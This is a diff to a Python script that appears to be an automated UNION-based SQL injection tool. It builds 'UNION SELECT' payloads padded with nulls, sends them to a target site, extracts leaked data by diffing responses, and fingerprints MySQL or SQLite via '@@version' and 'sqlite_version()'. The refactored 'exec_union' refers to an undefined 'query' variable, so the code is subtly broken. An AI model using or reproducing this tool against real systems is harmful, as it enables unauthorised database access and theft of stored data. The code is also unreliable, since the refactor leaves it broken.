@@ -56,13 +56,13 @@ def get_diff(str1, str2):
 		ret = ret + d[1:].strip() + '\n'
 	return ret
 
-def get_result(str1, str2, query):
+def get_result(str1, str2, query=""):
 	diff = get_diff(str1, str2)
 	result = diff.replace("<b>", "")
 	result = result.replace("</b>", "")
 	result = re.sub('<(.|\n)*?>', '\n', result)
-	result = result.replace(query, "[query]")
-	print(result)
+	if query:
+		result = result.replace(query, "[query]")
 	return result
 
 class Union:
@@ -107,35 +107,34 @@ class Union:
 		print(f"column counts: {column_counts}")
 		return column_counts
 
-	def exec_union(self, column_name, contents):
-		column_lst = [column_name] * self.column_counts
+	def submit_query(self, column_name, contents=""):
+		column_lst = ["null"] * (self.column_counts - 1)
+		column_lst.append(column_name)
 		colums = ", ".join(column_lst)
 		query = self.header + "SELECT " + colums + contents + self.comment
 		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
-		res = self.submit(query)
-		#print(res.text)
-		result = get_result(self.original_text, res.text, query)
+		return self.submit(query).text
+
+	def exec_union(self, column_name, contents):
+		response = self.submit_query(column_name, contents)
+		result = get_result(self.original_text, response, query)
 		if not result:
 			raise self.UnionException("this method does not work")
 		#print(result)
 
-	def check_union(self, column_name, contents):
-		column_lst = [column_name] * self.column_counts
-		colums = ", ".join(column_lst)
-		query = self.header + "SELECT " + colums + contents + self.comment
-		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
-		res = self.submit(query)
-		#print(res.text)
-		result = get_result(self.original_text, res.text, query)
-		log_to_file(self.original_text, res.text)
+	def check_union(self, column_name, compare):
+		response = self.submit_query(column_name)
+		result = get_result(compare, response)
+		log_to_file(compare, response)
 		#print(result)
 		return result
 
 	def get_version(self):
-		result = self.check_union("@@version", "")
+		response = self.submit_query("error")
+		result = self.check_union("@@version", response)
 		if result:
 			return
-		result = self.check_union("sqlite_version()", "")
+		result = self.check_union("sqlite_version()", response)
 		if result:
 			self.mysql = False
 
